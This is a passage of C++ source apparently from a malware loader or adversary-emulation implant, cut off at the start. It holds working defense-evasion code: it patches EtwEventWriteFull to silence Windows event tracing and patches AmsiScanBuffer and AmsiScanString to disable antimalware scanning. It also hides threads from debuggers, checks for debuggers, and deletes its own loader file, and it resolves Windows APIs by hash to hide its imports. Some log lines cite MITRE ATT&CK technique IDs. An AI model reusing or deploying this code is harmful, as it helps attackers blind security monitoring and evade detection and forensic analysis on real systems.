			if (EtwEventWriteC[func_length] == x64_ret && EtwEventWriteC[func_length + 1] == 0xCC)
				break;

			if (func_length == MAX_SEARCH_INDEX)
			{
				LOG_ERROR("Unable to find EtwEventWrite");
				goto CLEANUP;
			}

			func_length++;
		}

		while (!EtwEventWriteFullC)
		{
			if (EtwEventWriteC[func_length] == 0xE8)
			{
				offset = EtwEventWriteC[func_length + 1];
				EtwEventWriteFullC = &EtwEventWriteC[func_length] + 1 + sizeof(DWORD) + offset;
				break;
			}

			if (func_length == MAX_SEARCH_INDEX)
			{
				LOG_ERROR("Unable to find EtwEventWriteFull");
				goto CLEANUP;
			}
			func_length--;
		}

		LOG_SUCCESS("Found EtwEventWriteFull at %016llX", EtwEventWriteFullC);

		if (!VirtualProtectExC(0, EtwEventWriteFullC, sizeof(patch), PAGE_READWRITE, &old_protection)) goto CLEANUP;

		memcpy(&backup, EtwEventWriteFullC, sizeof(patch)); // Backup the EtwEventWriteFull address
		memcpy(EtwEventWriteFullC, &patch, sizeof(patch)); // Patch the address

		// Restore opcodes if mem protections cannot be reverted
		if (!VirtualProtectExC(0, EtwEventWriteFullC, sizeof(patch), old_protection, &old_protection))
		{
			memcpy(EtwEventWriteFullC, &backup, sizeof(patch));
			goto CLEANUP;
		}

		success = TRUE;
	CLEANUP:
		return success;
	}

	//
	// Patch AMSI via ScanBuffer
	//
	BOOL PatchAmsiScanBuffer(void)
	{
		BOOL success = FALSE;
		HMODULE amsi = NULL;
		HAMSICONTEXT amsi_context = NULL;

		const ULONG hash_amsi = HashStringFowlerNollVoVariant1a("amsi.dll");
		const ULONG hash_amsiinitialize = HashStringFowlerNollVoVariant1a("AmsiInitialize");
		const ULONG hash_amsiscanbuffer = HashStringFowlerNollVoVariant1a("AmsiScanBuffer");
		const ULONG hash_amsiscanstring = HashStringFowlerNollVoVariant1a("AmsiScanString");

		amsi = GetModuleHandleC(hash_amsi);
		if (!amsi)
		{
			LOG_ERROR("Unable to resolve amsi.dll");
			return success;
		}

		typeAmsiInitialize AmsiInitialize = (typeAmsiInitialize)GetProcAddressC(amsi, hash_amsiinitialize);
		FARPROC AmsiScanBuffer = (FARPROC)GetProcAddressC(amsi, hash_amsiscanbuffer);
		FARPROC AmsiScanString = (FARPROC)GetProcAddressC(amsi, hash_amsiscanstring);

		if (!AmsiScanBuffer | !AmsiScanString) return success;

		LOG_INFO("AmsiScanBuffer: %016llX", (size_t)AmsiScanBuffer);
		LOG_INFO("AmsiScanString: %016llX", (size_t)AmsiScanString);

		AmsiInitialize(L"AmsiContext", &amsi_context);

		PatchFunction(AmsiScanBuffer);
		PatchFunction(AmsiScanString);

		LOG_SUCCESS("Amsi Patched");
		success = TRUE;

		return success;
	}

	/////////////////////////////
   //                         //
  //      Anti Debugging     //
 //                         //
/////////////////////////////

	//
	// Hide a given thread from the debugger by setting THREAD_INFO_CLASS::ThreadHideFromDebugger
	// Defaults to current thread unless specified otherwise.
	//
	VOID HideFromDebugger(_In_ HANDLE ThreadHandle)
	{
		constexpr DWORD hash_ntdll = HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr DWORD hash_ntsetinformationthread = HashStringFowlerNollVoVariant1a("NtSetInformationThread");

		HMODULE ntdll = GetModuleHandleC(hash_ntdll);
		if (!ntdll) return;
		typeNtSetInformationThread NtSetInformationThread = (typeNtSetInformationThread)GetProcAddressC(ntdll, hash_ntsetinformationthread);
		if (!NtSetInformationThread) return;

		NtSetInformationThread(ThreadHandle, ThreadHideFromDebugger, NULL, 0);
		return;
	}

	//
	// Check if debugger is present
	// Return TRUE if being debugged
	//
	BOOL IsDebuggerPresent()
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;

		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		const ULONG hash_isdebuggerpresent = HashStringFowlerNollVoVariant1a("IsDebuggerPresent");

		kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return FALSE;

		typeIsDebuggerPresent IsDebuggerPresent = (typeIsDebuggerPresent)GetProcAddressC(kernel32, hash_isdebuggerpresent);

		LOG_INFO("[T1622] Checking for Debugger Presence");
		success = IsDebuggerPresent();
		if (success)
		{
			LOG_INFO("Process Currently being Debugged.");
			return success;
		}

		return success;
	}

	//
	// Check if the process is being debugged remotely
	// If it is then return TRUE
	//
	BOOL IsRemoteDebuggerPresent(_In_ HANDLE process_handle)
	{
		HMODULE kernel32 = NULL;
		BOOL debugger_present = FALSE;
		process_handle = INVALID_HANDLE_VALUE;

		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		const ULONG hash_checkremotedebuggerpresent = HashStringFowlerNollVoVariant1a("CheckRemoteDebuggerPresent");

		kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return FALSE;

		typeCheckRemoteDebuggerPresent CheckRemoteDebuggerPresent = (typeCheckRemoteDebuggerPresent)GetProcAddressC(kernel32, hash_checkremotedebuggerpresent);
		CheckRemoteDebuggerPresent(process_handle, &debugger_present);
		if (debugger_present)
		{
			return debugger_present;
		}

		LOG_INFO("[T1622] Checking for Debugger Presence");
		return debugger_present;
	}

	VOID SelfDeleteLoader(void)
	{
		LOG_INFO("[T1070.004] Attempting to Delete Loader");

		const LPCWSTR original_file = L"able_del.exe";
		const LPCWSTR sacrificial_file = L"able_tmp.exe";

		SECURITY_ATTRIBUTES sa = { 0 };
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi = { 0 };

		ZeroMemoryEx(&sa, sizeof(sa));
		ZeroMemoryEx(&si, sizeof(si));
		ZeroMemoryEx(&pi, sizeof(pi));

		const ULONG hash_kernel32 = HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		const ULONG hash_exitprocess = HashStringFowlerNollVoVariant1a("ExitProcess");
		const ULONG hash_unmapviewoffile = HashStringFowlerNollVoVariant1a("UnmapViewOfFile");
		const ULONG hash_createprocessa = HashStringFowlerNollVoVariant1a("CreateProcessA");

#if UNICODE
		const ULONG hash_createprocessw = HashStringFowlerNollVoVariant1a("CreateProcessW");
		const ULONG hash_createfilew = HashStringFowlerNollVoVariant1a("CreateFileW");
		const ULONG hash_movefilew = HashStringFowlerNollVoVariant1a("MoveFileW");
		const ULONG hash_copyfilew = HashStringFowlerNollVoVariant1a("CopyFileW");
#else
		const ULONG hash_createfilea = HashStringFowlerNollVoVariant1a("CreateFileA");
		const ULONG hash_movefilea = HashStringFowlerNollVoVariant1a("MoveFileA");
		const ULONG hash_copyfilea = HashStringFowlerNollVoVariant1a("CopyFileA");
#endif

		HMODULE kernel32 = GetModuleHandleC(hash_kernel32);
		if (!kernel32) return;

		typeExitProcess ExitProcess = (typeExitProcess)GetProcAddressC(kernel32, hash_exitprocess);
		typeUnmapViewOfFile UnmapViewOfFile = (typeUnmapViewOfFile)GetProcAddressC(kernel32, hash_unmapviewoffile);

#if UNICODE
		typeCreateFileW CreateFileW = (typeCreateFileW)GetProcAddressC(kernel32, hash_createfilew);
		typeCreateProcessW CreateProcessW = (typeCreateProcessW)GetProcAddressC(kernel32, hash_createprocessw);
		typeCopyFileW CopyFile = (typeCopyFileW)GetProcAddressC(kernel32, hash_copyfilew);
		typeMoveFileW MoveFile = (typeMoveFileW)GetProcAddressC(kernel32, hash_movefilew);
		LPWSTR file_path = NULL;
#define CreateFile CreateFileW
#define CopyFile CopyFileW
#define MoveFile MoveFileW
#define CreateProcess CreateProcessW
#else
		typeCopyFileA CopyFile = (typeCopyFileA)GetProcAddressC(kernel32, hash_copyfilea);
		typeCreateProcessA CreateProcessA = (typeCreateProcessA)GetProcAddressC(kernel32, hash_createprocessa);
		typeMoveFileA MoveFile = (typeMoveFileA)GetProcAddressC(kernel32, hash_movefilea);
		typeCreateFileA CreateFileA = (typeCreateFileA)GetProcAddressC(kernel32, hash_createfilea);
		LPSTR file_path = NULL;
#define CreateFile CreateFileA
#define CreateProcess CreateProcessA
#define CopyFile CopyFileA
#define MoveFile MoveFileA
#endif
		file_path = GetFilePathW();

		if (!CopyFile(file_path, sacrificial_file, FALSE))
		{
			LOG_ERROR("Failed to copy file.");
			return;
		}

		HANDLE hFile = CreateFile(sacrificial_file, 0, FILE_SHARE_READ, &sa, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			LOG_ERROR("Failed to create file handle.");
			return;
		}

		if (!CreateProcess(NULL, (LPWSTR)file_path, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
		{
			LOG_ERROR("Failed to create process.");
			return;
		}

		while (!DeleteFile(sacrificial_file));

		LOG_SUCCESS("Deleting Loader");

		ExitProcess(0);
		return;
	}

	///////////////////////
   //                   //
  //      Service      //
 //                   //
///////////////////////

	HANDLE CreateEventA(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCSTR lpName)
	{
		HMODULE advapi32 = NULL;

		const ULONG hash_createeventa = HashStringFowlerNollVoVariant1a("CreateEventA");

		advapi32 = LoadLibraryC("ADVAPI32.DLL");
		typeCreateEventA CreateEventA = (typeCreateEventA)GetProcAddressC(advapi32, hash_createeventa);

		return CreateEventA(lpEventAttributes, bManualReset, bInitialState, lpName);
	}

	HANDLE CreateEventW(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCWSTR lpName)
	{
		HMODULE advapi32 = NULL;

		const ULONG hash_createeventw = HashStringFowlerNollVoVariant1a("CreateEventW");

		advapi32 = LoadLibraryC("ADVAPI32.DLL");

		typeCreateEventW CreateEventW = (typeCreateEventW)GetProcAddressC(advapi32, hash_createeventw);

		return CreateEventW(lpEventAttributes, bManualReset, bInitialState, lpName);
	}

	SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerA(_In_ LPCSTR lpServiceName, _In_ LPHANDLER_FUNCTION lpHandlerProc)
	{
		HMODULE advapi32 = NULL;
		const ULONG hash_registerservicectrlhandlera = HashStringFowlerNollVoVariant1a("RegisterServiceCtrlHandlerA");

		advapi32 = LoadLibraryC("Advapi32.dll");
		if (!advapi32) return NULL;

		typeRegisterServiceCtrlHandlerA RegisterServiceCtrlHandlerA = (typeRegisterServiceCtrlHandlerA)GetProcAddressC(advapi32, hash_registerservicectrlhandlera);
		return RegisterServiceCtrlHandlerA(lpServiceName, lpHandlerProc);
	}

	SERVICE_STATUS_HANDLE RegisterServiceCtrlHandlerW(_In_ LPCWSTR lpServiceName, _In_ LPHANDLER_FUNCTION lpHandlerProc)
	{
		HMODULE advapi32 = NULL;

		const ULONG hash_advapi32 = HashStringFowlerNollVoVariant1a("ADVAPI32.DLL");
		const ULONG hash_registerservicectrlhandlerw = HashStringFowlerNollVoVariant1a("RegisterServiceCtrlHandlerW");

		advapi32 = LoadLibraryC("Advapi32.dll");
		if (!advapi32) return NULL;

		typeRegisterServiceCtrlHandlerW RegisterServiceCtrlHandlerW = (typeRegisterServiceCtrlHandlerW)GetProcAddressC(advapi32, hash_registerservicectrlhandlerw);
		return RegisterServiceCtrlHandlerW(lpServiceName, lpHandlerProc);
	}

	BOOL StartServiceCtrlDispatcherA(_In_ CONST SERVICE_TABLE_ENTRYA* lpServiceStartTable)
	{
		HMODULE advapi32 = NULL;

		const ULONG hash_advapi32 = HashStringFowlerNollVoVariant1a("ADVAPI32.DLL");
		const ULONG hash_startservicectrldispatchera = HashStringFowlerNollVoVariant1a("StartServiceCtrlDispatcherA");

		advapi32 = LoadLibraryC("Advapi32.dll");

		if (!advapi32) return FALSE;
		typeStartServiceCtrlDispatcherA StartServiceCtrlDispatcherA = (typeStartServiceCtrlDispatcherA)GetProcAddressC(advapi32, hash_startservicectrldispatchera);

		return StartServiceCtrlDispatcherA(lpServiceStartTable);
	}

	BOOL StartServiceCtrlDispatcherW(_In_ CONST SERVICE_TABLE_ENTRYW* lpServiceStartTable)
	{
		HMODULE advapi32 = NULL;

		const ULONG hash_advapi32 = HashStringFowlerNollVoVariant1a("ADVAPI32.DLL");
		const ULONG hash_startservicectrldispatcherw = HashStringFowlerNollVoVariant1a("StartServiceCtrlDispatcherW");

		advapi32 = LoadLibraryC("Advapi32.dll");
		if (!advapi32) return FALSE;

		typeStartServiceCtrlDispatcherW StartServiceCtrlDispatcherW = (typeStartServiceCtrlDispatcherW)GetProcAddressC(advapi32, hash_startservicectrldispatcherw);

		return StartServiceCtrlDispatcherW(lpServiceStartTable);
	}
}
